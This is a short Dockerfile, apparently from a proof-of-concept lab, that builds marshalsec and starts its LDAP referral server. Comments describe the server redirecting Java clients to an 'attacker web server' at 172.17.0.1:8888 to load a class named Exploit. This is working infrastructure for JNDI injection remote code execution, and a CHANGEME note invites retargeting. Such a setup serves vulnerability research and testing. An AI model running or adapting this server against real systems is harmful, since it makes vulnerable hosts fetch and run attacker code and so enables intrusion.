FROM maven:3.8-jdk-11
EXPOSE 1389
RUN mkdir /marshalsec
COPY marshalsec/ /marshalsec
WORKDIR /marshalsec
RUN mvn package -DskipTests

# sleep 5 for race condition
RUN sleep 5

# Make marshalsec's LDAP server to redirect the client to host (172.17.0.1)'s attacker web server
# CHANGEME to change attacker web server's 8888 port. 
CMD ["java", "-cp", "/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer" ,"http://172.17.0.1:8888/#Exploit"]
